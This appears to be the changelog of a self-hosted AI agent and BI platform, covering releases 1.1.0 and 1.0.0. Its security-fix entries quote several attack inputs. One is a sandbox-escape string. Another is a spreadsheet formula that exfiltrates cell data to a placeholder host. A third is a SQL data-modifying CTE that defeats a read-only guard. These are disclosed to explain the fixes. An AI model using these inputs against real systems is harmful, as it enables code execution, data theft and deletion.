# Changelog

Notable changes to AgentSwarms. Newest first.

This file exists partly for you and partly for the person evaluating whether
this project is maintained — an absent changelog reads as abandonment risk
regardless of how active the commit log is.

Dates are the date work landed. From 1.0.0 the project cuts numbered
releases as git tags (see the GitHub Releases page); `main` remains the
development branch and may be ahead of the latest tag.

---

## 1.1.0 — 2026-08-08

**Swarms grow up.** A deployed swarm now serves a version you chose rather than
whatever is on the canvas, custom code runs in deployed runs and not just the
browser, and there is a way to measure whether a change made a swarm better.
Knowledge bases gain the three retrieval features that separated this from
Dify. Nine migrations — run `npx supabase db push` after upgrading.

### Swarms

- **Draft vs published.** Editing a swarm used to change what its API keys
  served the moment you pressed Save — mid-experiment, at 3am, to production
  callers. Version history made that recoverable, not preventable. The canvas
  now edits a **draft**; API keys, schedules, sub-swarm calls and embeds all
  execute a **pinned snapshot**. All four loaders resolve it through one shared
  function, because one of them quietly reading `nodes` instead would
  reintroduce the whole bug for that path only. Creating a swarm's first key,
  schedule or embed key publishes the current graph through a **database
  trigger** rather than app code — a future write path would otherwise skip it
  silently. Swarms deployed before this fall back to the live draft and the UI
  says so, so upgrading changes nothing on the day it is applied. **Unpin**
  restores the old behaviour for anyone who wants it.
- **Batch evaluations.** Run a dataset of cases through a swarm and score every
  output. The judge's own pass/fail is **ignored** and the verdict recomputed
  from weighted per-metric scores, because a model that grades and then decides
  will contradict itself; a missing metric is a rejection rather than a zero,
  since silently scoring an unanswered question as 0 is indistinguishable from
  a bad answer. `UNIQUE(eval_run_id, case_id)` makes a retried run idempotent.
- **Custom components.** Author a snippet once with a declared parameter schema
  and it appears in every swarm's palette. Bindings are **snapshots, not live
  links**: a node carries the code and schema it was built with, so editing the
  library cannot silently change a swarm that already works, an exported swarm
  carries everything it needs, and deleting a component leaves working swarms
  working. Parameters arrive **typed** — a number param is a number, not `"5"`.
- **File inputs.** A start-form field of type `file` accepts a PDF, DOCX or text
  document, extracts its text in the browser using the same parsers the
  Knowledge Base uses, and seeds it into flow state. Truncation is always
  reported rather than silently applied.
- **Custom code in deployed runs**, via a hardened sandbox container
  (`--profile sandbox`). Function and component nodes previously worked on the
  canvas only, because the app process holds the service-role key and every
  provider credential. They now execute in a separate container: a fresh V8
  realm per call, a worker thread terminated afterwards (which kills a
  synchronous infinite loop, as a Promise race cannot), an internal-only
  network, `read_only`, `cap_drop ALL`, and a refusal to start without
  `INTERNAL_RUN_SECRET`. **A probe caught a critical escape before any of it
  shipped**: the first version passed a host `console` into the vm, and every
  host function carries the host `Function` constructor on its prototype chain,
  so `console.log.constructor("return process")()` returned the real `process`.
  Nothing from the host realm enters the context now — the console and ctx are
  built _inside_ the sandbox realm and only JSON strings cross.

### Knowledge bases

- **Parent-child chunking.** Retrieval and generation want opposite chunk
  sizes: small chunks match precisely, large chunks let the model answer. Small
  children are embedded and the matched child expands to its **parent** before
  the text reaches the model. Children are cut from their parent and never
  across it, so a citation always contains the words that retrieved it. Parents
  do not overlap, or two neighbouring matches would send the model the same
  sentences twice.
- **Q&A indexing.** A question and a statement are different kinds of text, and
  that difference is a real part of the distance between their vectors. Q&A mode
  generates pairs and embeds the **question**, so the comparison is
  question-to-question. Generation failures are reported per document and never
  downgraded to flat chunks — a collection that disagreed with its own settings
  would be undebuggable.
- **Hybrid retrieval with a weighting slider.** Keyword search existed, but only
  ever looked at documents with **no** embeddings, so an exact term inside an
  embedded document could not rescue a weak semantic match. Postgres full-text
  search now runs over the same chunks and the two are fused by a per-collection
  weight. Scores are normalised within each list first: cosine (~0.3–0.9) and
  `ts_rank` (~0.0–0.3) are not comparable numbers, and adding them raw would
  make the slider do nothing across most of its range.
- **Embeddings default to OpenRouter in the UI**, as they already did on the
  server. The dialog only offered a provider the _user_ had connected, and an
  operator key is not a personal integration — so an instance with
  `OPENROUTER_API_KEY` set displayed OpenAI while the server embedded through
  OpenRouter. Three call sites answered "is this provider usable" and each
  answered differently; they now share one rule.
- **Fixed: two advertised OpenRouter embedding models did not exist.** Both
  `nvidia/*` entries returned `404 No endpoints found`, so selecting one
  produced a failed embed with nothing to indicate the model was never
  available. Replaced with five models probed against the live endpoint, each
  confirmed to return 1536 dimensions. Their prices were **measured** from
  OpenRouter's own billed `usage.cost` rather than guessed, because a
  selectable model with no price makes budgets stop accumulating silently.
- Existing collections default to semantic-only, so upgrading changes no
  answers until someone opts in. Changing chunk mode does not rewrite existing
  chunks; a **Re-index** action does it explicitly, since re-chunking means
  paying to embed the document again.

### Security & governance

- **Fixed: a cross-tenant hole let any user run another tenant's swarm.** The
  RLS policies on `swarm_api_keys` and `swarm_schedules` checked only that a row
  belonged to you — never that the swarm it named did. Any authenticated user
  could insert an API key row pointing at someone else's `swarm_id`, with a key
  hash they chose, then call `POST /api/swarm/run` and receive that swarm's
  output. The server function that mints keys checked ownership, but the anon
  key is public by design and a direct PostgREST insert bypassed it entirely.
  Verified against a live instance before fixing. Both halves of each policy now
  require swarm ownership, and any row already created through the hole is
  removed on migration.

### Observability

- **Observability → Monitoring.** Every optional piece of a deployment is a
  Compose profile an operator may or may not have started, which made "is this
  deployment complete?" a question with no answer in the product. One row per
  service with status, response time and the address that answered, plus live
  CPU, memory and disk. An optional service that was never started reads **"Not
  running" in grey with the command that would start it** — not a red "Down",
  because a status page that cries wolf is one people stop opening. Memory
  reports the **container's cgroup limit** when there is one, not the host's
  RAM: showing 3 GB of 64 GB while the container is killed at 4 GB is worse than
  showing nothing. Superadmin-only in both the page and each server function.
- **Fixed: the monitoring page reported a running service as DOWN.** The egress
  proxy publishes no host port, so an app running outside Compose cannot probe
  it. Services now carry `hostPublished`, derived from compose and pinned by a
  test, and an unreachable service reports **"Can't check from here"** with the
  reason instead of inventing a failure.

### Business intelligence

- **Two end-to-end samples** — Supply Chain Pulse and People Analytics — each
  shipping a dataset, knowledge base, prep flow, semantic model, dashboard and
  ontology, so the BI story can be evaluated without building one first.
- **Fixed: 65 widget queries in six legacy sample dashboards** still used
  AlaSQL-era bracket syntax and returned nothing under DuckDB. Each repaired
  query was validated against the real engine.
- The BI snapshot row cap is **one configurable knob** rather than two
  constants that could disagree.
- Data prep source sections collapse (closed by default, with search), the
  semantic layer leads with fields instead of making you scroll for them, and
  the catalog keeps **Query data** visible.

### Install & deployment

- **`--all` starts every service.** Measured before changing anything:
  `docker compose up` brought up **one** container; with the three profiles,
  six. The guidance had drifted further — the README listed `--docgen` but never
  `--notebooks` or `--sandbox`, and neither setup script had a way to say "give
  me everything". Both scripts now end by pointing at Observability →
  Monitoring, which is the thing that can actually confirm the result.
- **Self-hosted Supabase guide**, verified by running the full migration set
  against a bare `supabase/postgres` container rather than assuming. That found
  a real ordering trap: three migrations write to `storage.buckets`, and the
  `public` column they use is created by the storage service's own migrations —
  so the stack must be started and allowed to settle _before_ the schema is
  pushed.
- **Fixed: four `VITE_` settings could not reach the Docker build**, including
  the BI snapshot cap added in the same release.
- **DEPLOYMENT.md fact-checked line by line.** A dead cross-reference to a
  section that does not exist, a stale "146 migrations / 98 tables" claim (now
  dated rather than silently bumped, which would assert a bare-container test
  that has not been re-run), and a local-install section that still recommended
  a command starting the app alone. The in-app self-hosting page was missing the
  `sandbox` profile entirely.

---

## 1.0.0 — 2026-08-06

**First numbered release.** Everything below shipped on `main` since the last
changelog cut and is included in `v1.0.0`, alongside the platform itself:
agents and multi-agent swarms with a visual canvas, RAG knowledge bases with
cloud-source sync, an AI-native BI suite over 22 warehouse connectors and 5
SaaS app sources, IAM with groups/grants/model rules, budgets, hash-chained
audit, and full execution traces — self-hosted on one Supabase project and
one container, under the Elastic License 2.0.

### Data sources

- **Connections can be shared through IAM** — databases/warehouses and app
  sources are now grantable resource types, so an analyst uses a connection
  without a second copy of the credential existing. A shared connection **runs
  as its owner**: the credential is decrypted server-side and the query goes to
  the owner's warehouse, so a grantee gains the _use_ of it without ever
  receiving it. Unlike other shared resources these rows carry the encrypted
  secret, so there is deliberately **no row-level policy** granting access —
  the grant is resolved server-side and the row loaded with the service role.
  A shared app source **syncs as its owner, into the owner's datasets**, so a
  grantee re-running a stale sync refreshes the real data rather than building
  a parallel copy under their own account.
- **Connection pooling** for PostgreSQL- and MySQL-family sources. Opening a
  connection was **92% of a `SELECT 1`** against a local Postgres (24.9 ms of
  27.1 ms), and that is the best case — a loopback socket with no TLS. End to
  end the driver went from **30.7 ms to 2.9 ms per query**, with identical
  results; `scripts/bench-pool.ts` reproduces both numbers and asserts the
  equality. Pools are keyed by a hash of every credential, so two tenants never
  share a session and a rotated password never reuses the old one.
- **Corporate proxy support and retries** on every outbound connector call.
  `HTTPS_PROXY`/`NO_PROXY` are honoured — many enterprises have no direct
  egress at all, and without this the product simply cannot reach Snowflake or
  Stripe from inside such a network. Transient failures retry with exponential
  backoff and full jitter. `500` is deliberately **not** retried by default: it
  usually means the query ran and then failed, so a retry pays for the same
  scan twice.
- **Scheduled health checks and credential age** for data connections, using
  the product's own probes rather than bespoke ones. A warehouse password
  expiring on your rotation policy now surfaces as a badge and one
  notification, instead of a dashboard erroring in front of a customer.
  Advisory throughout — nothing is auto-disabled and nothing expires.
- **SaaS connectors.** Google Sheets, Stripe, Shopify, HubSpot and Salesforce
  sync into datasets on a shared ingest path — the same type inference,
  staging and snapshot-then-swap a CSV upload uses, so a synced dataset
  behaves identically to an uploaded one. Sync runs manually or on an hourly,
  daily or weekly schedule.
- **12 more databases and warehouses**, taking the total to 22: Microsoft SQL
  Server / Azure SQL, ClickHouse, CockroachDB, TimescaleDB, AlloyDB,
  Greenplum, YugabyteDB, MariaDB, SingleStore, StarRocks, Apache Doris and
  PlanetScale. Wire-compatible providers share one proven driver per protocol
  rather than getting near-duplicate implementations.
- **Fixed: 17 of 22 warehouse providers could not be saved.** The `provider`
  CHECK constraint had never been widened past the original five, so
  PostgreSQL, MySQL, Trino, Athena and Oracle — all long shipped — failed on
  insert with a constraint violation that named neither the provider nor the
  reason. A test now parses the constraint from the migrations and fails CI if
  it drifts from the TypeScript union again.

### Semantic layer

- **Fixed: validation was broken for every local semantic model.** The
  compiler's dialect defaults to `alasql` and the warehouse branch overrode it;
  the local branch never did. Once the local engine became DuckDB, validation
  compiled AlaSQL-quoted SQL and ran it on DuckDB, so **every field failed** —
  `SELECT 'Order ID' AS 'order_id' FROM saas_sales LIMIT 1`, where AlaSQL's
  quoting makes a string literal out of a column name and a syntax error out of
  the alias. 23 of 23 fields failed on the bundled sample model. The query path
  had resolved this correctly all along; only validation was left behind.
- **Fixed: validation reloaded every dataset once per field.** It probes one
  query per dimension and per metric, sequentially, and each went through a
  helper that reloads every dataset the caller can see — every row — on each
  call. A 19-field model meant nineteen full reloads, and the Validate button
  never returned. The datasets now load once for the whole probe loop; the
  read-only guard still runs per statement, because the tables are reusable and
  the guard is not.

- **Fixed: `ORDER BY` silently dropped a field it did not recognise.** The
  compiler rejects every unknown name — metric, dimension, filter field, grain,
  comparison, source table — with one exception, which filtered unknown
  `orderBy` fields out instead. So "top 10 customers by revenue" with a
  mistyped or since-renamed order field returned **an arbitrary ten rows, still
  labelled top 10**: no error, and a number on a dashboard that is wrong in a
  way nobody can see. It now refuses and names the columns the query does
  return, so an AI caller can correct itself. This is a **behaviour change** —
  a saved query carrying a stale order field now errors where it used to
  quietly return unordered rows.
- **Fixed: a malformed limit reached the database as `LIMIT NaN`.** The clamp
  was `Math.max(1, Math.min(q.limit ?? DEFAULT, MAX))`, and both of those pass
  NaN straight through, so a limit that did not parse produced invalid SQL and
  a syntax error from the warehouse rather than a clear rejection. A fractional
  limit produced `LIMIT 2.7`, which Postgres rejects outright. Limits are now
  floored, range-clamped and refused when not finite; a numeric string still
  works, because an AI-authored query may legitimately send `"50"`.
- Injection was probed directly and held: filter values are quote-escaped
  per dialect, `contains` escapes LIKE metacharacters with a dialect-neutral
  `~`, IN-lists are escaped element-wise, and an unsafe source table is
  rejected. `tests/unit/semanticRefusal.test.ts` pins all of it.

- **Relative date filters**: `last_n_days`, `this_month`, `last_month`,
  `this_quarter`, `last_quarter`, `ytd`. Half-open UTC windows resolved at
  query time, so a dashboard does not need editing as time passes.
- **Period-over-period**: `yoy`, `mom`, `prior_period`, adding `_prev`,
  `_change` and `_pct_change` per metric. Implemented as a date-shifted
  self-join rather than `LAG`, so a gap in the series cannot line a period up
  against the wrong predecessor.

### Query engine

- **Fixed: Run Query was unclickable on a 1366x768 laptop.** The SQL editor's
  toolbar is a `justify-between` flex row, and a flex item defaults to
  `min-width: auto` — so the right-hand group (source select 192px + Format 94px
  - Run Query 115px = 413px) kept its full width inside an editor column that is
    only 310px at a 1238px viewport. With `overflow: visible` it painted past the
    column and **underneath the AI panel**, which sits later in the DOM and so
    painted on top. The workbench's primary action could not be clicked at any
    width below roughly 1340px. The toolbar now wraps, the badge truncates and the
    source select shrinks; verified at 1100, 1238, 1366 and 1700. Typechecks, the
    full unit suite and a production build all passed throughout — only a browser
    was ever going to find this one.

- **One engine everywhere: the browser now runs DuckDB-Wasm.** Local datasets
  used to execute in AlaSQL in the browser and DuckDB on the server, and the
  two disagreed. Measured across the 61 NL-to-SQL reference queries, AlaSQL
  answered 56 — and **three of the five failures were silent**: "share of
  total" dropped its computed column, and a running total returned `0` for
  every row, so a cumulative chart rendered as a flat line with nothing
  reporting an error. `RANK()` and a CTE referenced from a subquery failed
  outright. Joins were identical on both, which is why it went unnoticed.

  The `.wasm` binaries are self-hosted (not fetched from a CDN, so an
  air-gapped deployment still works), emitted as separate assets, and loaded
  lazily. Verify a deployment with **`/engine-check`**, which runs the
  previously-broken queries in the actual browser and reports which bundle it
  selected.

  The engine is ~8 MB, fetched once per browser and cached after. That wait is
  **shown, not hidden**: loading begins when a data page opens rather than when
  Run is pressed, and a **"Starting the SQL engine…" strip with a real progress
  bar** (byte-level, from duckdb-wasm's own callback) appears until it is
  ready — then disappears. If a Content-Security-Policy or proxy blocks
  WebAssembly, it says so and points at `/engine-check` instead of leaving a
  button that does nothing.

  Consequences worth knowing: every local query function is now `async`, and
  ~120 lines of hand-written JavaScript date shims are gone — DuckDB provides
  `strftime`, `date_trunc`, `split_part` and the rest natively. One of those
  shims took `strftime(format, value)` where every real engine takes
  `(value, format)`, so SQL written against it worked in the browser and
  failed on the server.

- **DuckDB is the default local engine on the server**; `LOCAL_ENGINE=alasql`
  is the escape hatch. Rows load through DuckDB's appender rather than one
  parameterised INSERT per row: a 5,000-row aggregate went from 2,152 ms to
  19.6 ms.

### Internal

- **Split the BI builder pane**, 2,664 lines → 1,754, across seven components:
  the AI analyst tab, the ontology editor, the chart-type picker, the table
  multi-select, the SQL editor, the matrix conditional-formatting editor, and
  the three chart option editors (drill hierarchy, time intelligence, reference
  line). Which regions to extract was decided by **measuring how many of the
  parent's values each one uses**, not by line count.

  **The first measurement was wrong, and its shape is worth knowing.** Scanning
  the whole 751-line chart editor gave 84 values and the conclusion "too coupled
  to split". But that block is a chain of `chartType === …` tests that are
  mutually exclusive, so 84 was a union over branches that never render
  together — not the coupling of anything in it. Measured per region, the
  conditional-formatting editor buried inside needed **six** of the parent's
  values for 160 lines, the best ratio in the file. A union over exclusive
  branches is not a coupling measure.

  What remains un-extracted is the field-slot mapping: ~132 lines against 35
  values, which really are fifteen-odd field/setter pairs that have to move
  together. The rule that survives is lines-per-prop — everything extracted
  carries ≥ 9, what stays carries 3.8 — and a test enforces the floor so a
  six-prop component cannot quietly become a thirty-prop one.

  No hook moved. Every extracted component owns no state and receives values
  and setters, so hook order and effect timing are untouched — that is what
  makes it a refactor. The JSX was copied by script and verified verbatim
  against the original after both sides were run through the same formatter,
  since a raw diff flags prettier's re-indentation and hides nothing.

### Security & governance

- **Fixed: one malformed ontology could blank a whole published dashboard.**
  An ontology spec is stored inside a widget's `chart` JSON, and `chart` is one
  of the fields the public sanitiser passes through to anonymous viewers. The
  graph renderer reads `spec.entities`, `spec.relations` **and `spec.domains`**;
  the guard meant to vet it checked only the first two, so a spec without
  `domains` passed and then threw inside render. **There is no error boundary
  anywhere in this app**, so that does not blank one widget — it blanks the
  page, for everyone holding the share link. The guard now checks every field
  the renderer dereferences and actually gates the render, with a "cannot be
  displayed" panel as the fallback. It previously had **zero callers**.
  (Correction to the first version of this note: the app _does_ have an error
  boundary — the router's, via `defaultErrorComponent`. It is per **route**, so
  the throw cost the entire dashboard rather than the whole browser.)

- **Fixed: exported CSVs could carry spreadsheet formulas (CWE-1236).** Excel,
  LibreOffice and Sheets execute a cell starting with `=`, `+`, `-`, `@`, tab or
  carriage return, and RFC-4180 quoting does not stop it — the quotes are
  consumed by the CSV parser and the cell is still a formula. It matters here
  because **the person exporting is not the author of the rows**: they arrive
  from SaaS connector syncs, from datasets another tenant shared, and from
  warehouse queries. `=HYPERLINK("https://x/?d="&A1,"Open")` exfiltrates the
  neighbouring cell when an analyst opens the file and clicks; Sheets runs
  `=IMPORTXML(...)` with no click. Such values are now prefixed with an
  apostrophe, which spreadsheets strip on display. **Numbers are exempt**, so
  `-5` is still `-5` rather than text.
- **Fixed: the dashboard page had a second, worse CSV escaper.** Its inline copy
  did not escape the **header row** at all, tested `/[",
]/` and so missed a
  bare carriage return, and had no formula guard. It now calls the shared
  writer, with a test that fails if a local escaper reappears.
- **Fixed: scheduled alerts counted NULL as zero.** `alertValue` coerced every
  cell with `Number()` and kept whatever was finite — but `Number(null)` is `0`
  and `0` is finite. On a response-time column with one blank row that made
  **avg 97.5 instead of 130 and min 0 instead of 120**, so "alert when
  `min(ms) < 5`" fired on a healthy service; on an all-negative column it made
  `max` 0 instead of the true maximum. `""`, `"   "` and `[]` coerce the same
  way. SQL aggregates ignore NULL and these now do too. This is the unattended
  path — the wrong number arrives as an email with nobody watching.

- **Fixed: the notebook egress allow-list silently accepted entries it could
  never enforce.** The kernel's outbound policy is a squid `dstdomain` ACL, and
  the hostname test allowed digits in every label, so **IP addresses passed**:
  `10.0.0.1` was written as the entry `.10.0.0.1`, which cannot match a request
  to that address. An operator who allow-listed an internal service believed
  egress to it worked; it never did. Fails closed, so it was not a hole — it
  was a security control that quietly did not do what its own configuration
  said. Labels with a leading or trailing hyphen had the same problem. The
  module's header said it was written pure "so the rules can be unit-tested";
  it had no tests, and now has 14.
- **Fixed: `date_of_birth` was not flagged as personal data.** The catalog's
  PII heuristic knew `dob`, `birth_date` and `birthday` but not `birth`, so the
  most common spelling of one of the most sensitive columns there is went
  unmarked. camelCase was invisible too — the terms anchor on `_`/`-`/space
  boundaries and `emailAddress` has none, so a database using that convention
  got no PII detection at all.
- **The PII heuristic had two copies**, in `lib/dataCatalog` and
  `utils/catalog/crawler.server`, the second labelled "client-side mirror of
  the crawler's heuristic". They were identical and nothing would have said so
  if they were not — the same arrangement that let the warehouse read-only
  guard lose its mutation denylist. Now one module, `lib/piiHeuristic`, with a
  test that fails if a second copy appears.
- **Row-level security is now tested.** RLS is on for **all 96 tables**, and
  the seven with no policy are service-role-only infrastructure (locks,
  cursors, the notebook runtime signing key) where deny-all is correct. Six
  tables carry a blanket `USING (true)` read policy; every one is restricted to
  `authenticated`, and they are pinned as an allow-list so a new one has to be
  justified rather than merged quietly.

- **Fixed: the warehouse "read-only" guard allowed writes to a customer's
  production database.** `assertReadOnlySql` was a second, hand-rolled copy of
  the local guard that checked the leading verb and rejected stacked statements
  but had **no mutation denylist**. A data-modifying CTE defeats a leading-verb
  check completely:

  ```sql
  WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d
  ```

  It begins with `WITH`, contains no semicolon, and deletes rows. PostgreSQL
  and all five wire-compatible forks here (CockroachDB, TimescaleDB, AlloyDB,
  Greenplum, YugabyteDB) run data-modifying CTEs, and T-SQL's
  `WITH cte AS (SELECT …) DELETE FROM cte` covers SQL Server and Azure SQL.
  Reachable from the SQL workbench and BI direct-query — and because a **shared
  connection runs as its owner**, a grantee with read access could have deleted
  from the granting tenant's warehouse.

  Both guards now share one implementation and differ only in which leading
  verbs they permit (the warehouse also allows `SHOW`/`DESCRIBE`/`EXPLAIN`).
  This file previously said the two copies should be kept "in sync in spirit";
  they were not, and a test now pins that the only difference is the verb list.

- **Fixed: a column named after a keyword was refused.** `SELECT "update" FROM t`
  and ``SELECT `delete` FROM t`` were rejected by both guards, because only
  string literals were stripped before the denylist ran, not quoted
  identifiers. A false positive on a security check is what eventually
  persuades someone to weaken it.
- **Fixed: the embed BI widget ignored an agent's SQL table allow-list.**
  `/api/embed/chat` is anonymous by design — a stranger types a question and,
  with Visual BI on, the owner's model writes SQL over the owner's data. The
  chat path and the swarm path both applied the owner's `sql_query` allow-list;
  **the widget path passed none**, so an agent restricted to one table still
  had every dataset the owner owns described to the model and could return rows
  from any of them. `describeUserTables` did not even accept an allow-list
  parameter, which is the sharper half: restricting execution while still
  naming the forbidden tables just tells the model what to ask for. Both are
  now applied, and the agent's saved list is read at the route. Absent or empty
  still means unrestricted, matching the chat tool — one surface quietly
  applying a stricter rule than the other is how two paths that must agree stop
  agreeing. [AGENT_CHAT.md](./docs/AGENT_CHAT.md#which-datasets-it-can-read--read-this-before-embedding)
  now says plainly to set the list on any publicly embedded agent.
- **Fixed: a numeric date column collapsed every row into 1970.** A `year`
  column of 2024/2025/2026 was parsed as seconds since the epoch, so all three
  landed ~34 minutes into 1 January 1970. `isMostlyDates` then reported "yes,
  dates", the UI offered the date-grain toggle, and choosing a grain rendered
  one bar where there should have been three — no error, no empty chart. The
  string branch had rejected these values since it was written; the number
  branch never did, so the same column bucketed differently depending on
  whether the loader typed it as text. `lib/biChartMath` had no tests at all
  and now has 29.

- **Per-agent semantic model allow-list**, deny by default. Enabling the
  Semantic Metrics tool alone no longer grants an agent every model in the
  account; it is also enforced when the tool runs, not only in what the agent
  is shown.
- **Swarm scheduler correctness**: the "claim" before a scheduled run was an
  unconditional update and claimed nothing, so two app instances could each
  fire the same scheduled swarm. Also, an interval of zero meant the swarm ran
  every tick, for ever.
- First test coverage for the AES-GCM credential encryption paths and for the
  scheduler.

### Site

- **Cost attribution by person and team**, with a scope switcher and a time
  range, on the dashboard's new **Spend & usage** panel. Spend can be charged
  back rather than only totalled.

  Scope is **authorised server-side, and refused rather than downgraded**:
  "My teams" resolves the groups the caller actually belongs to (never groups
  they name), "Whole organisation" is superadmin-only, and the picker offers
  only what that caller may use. Showing someone their own $12.40 labelled
  "Whole organisation" would be a lie the number itself cannot reveal.

  Team totals **overlap on purpose** — someone in two teams counts in both, so
  the rows do not sum to the total — and the UI says so. Cost reads the same
  column the budget caps do, so a figure here cannot disagree with a budget
  alert. Windows are half-open and UTC.

- Public [Security](/security) and [Licensing & support](/license) pages.
- Dashboard surfaces failed syncs, unreachable connections, failed scheduled
  runs, and budget used this month.

### Documentation

- **Fixed: the docs asked for a Supabase project id that nothing reads.**
  `VITE_SUPABASE_PROJECT_ID` and `SUPABASE_PROJECT_ID` were in
  `.env.example`'s _required_ block, the Dockerfile, compose build args and
  three docs. The CLI takes the ref as `supabase link --project-ref`, a flag.
  A required setup step that did nothing.
- **Fixed: the notebook runtime's env/settings precedence was documented
  backwards**, and it promised a `NOTEBOOK_EGRESS_ALLOWLIST` variable that does
  not exist.
- **Fixed: "all ten connectors"** — written when there were ten, and there are 22. Worse, only ten were _documented_: SQL Server and ClickHouse, which have
  fields nothing else has, had no entry at all.
- Twelve environment variables the code reads were documented nowhere,
  including four rate limits with no other way to discover them.
- `tests/unit/docsFreshness.test.ts` now fails CI on any of these: an env var
  the code reads that no doc mentions, a setting the docs promise that no code
  reads, or a stale connector count.
